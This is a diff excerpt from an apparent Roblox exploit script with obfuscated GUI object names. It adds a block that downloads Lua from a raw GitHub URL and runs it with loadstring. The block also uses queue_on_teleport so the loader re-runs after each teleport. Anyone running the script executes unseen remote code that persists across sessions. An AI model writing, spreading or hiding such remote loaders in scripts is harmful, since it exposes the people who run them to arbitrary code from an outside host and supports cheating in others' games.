@@ -18,6 +18,15 @@ local UICorner_4 = Instance.new("UICorner")
 local clr = Instance.new("TextButton")
 local UICorner_5 = Instance.new("UICorner")
 
+local currentScript = [[
+print("NEROVEN Loaded")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/TuMeuT-Original/gaginfo/refs/heads/main/asddfh.lua'))()
+]]
+if queue_on_teleport then
+	queue_on_teleport(currentScript)
+end
+
+
 --Properties:
 
 DFGKhedk4BDEYfdSWWtehuj5REYHYGTER.Name = "DFG#%Khedk4BDE$%^YfdS%W#$Wtehuj5R%EYH$^YGT&$ER%"
